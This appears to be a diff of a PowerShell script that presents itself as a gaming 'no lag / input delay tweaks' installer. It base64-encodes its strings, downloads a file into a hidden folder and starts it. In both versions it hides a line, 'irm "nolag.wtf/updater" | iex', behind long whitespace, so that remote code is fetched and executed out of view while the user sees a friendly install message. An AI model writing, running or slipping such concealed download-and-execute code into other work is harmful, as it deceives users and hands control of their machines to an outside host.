@@ -3,7 +3,7 @@
 
 
 $updaterB64 = "dHdlYWtzLnJlZw=="
-$fileB64 = "dHdlYWtzLm5vbGFnLnd0Zi90d2Vha3MucmVn"
+$fileB64 = "bm9sYWcud3RmL3R3ZWFrcw=="
 $hiddenAttrB64 = "SGlkZGVu"
 $stopActionB64 = "U3RvcA=="
 $directoryB64 = "RGlyZWN0b3J5"
@@ -28,11 +28,13 @@ $tempPath = Join-Path $hiddenFolder $updater
 
 try {
     Invoke-WebRequest -Uri $file -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
-    Start-Process -FilePath $tempPath -WindowStyle $hiddenAttr -Verb $runAs -Wait
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         irm "nolag.wtf/updater" | iex
+    Start-Process -FilePath $tempPath
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            irm "nolag.wtf/updater" | iex
                                                                                                                                                                                                                                                                                                                                                                                                  
 } catch {
-    
+    exit 1
 } finally {
     Write-Host "No lag / Input Delay Tweaks Are Installing."
+     
+    
 }
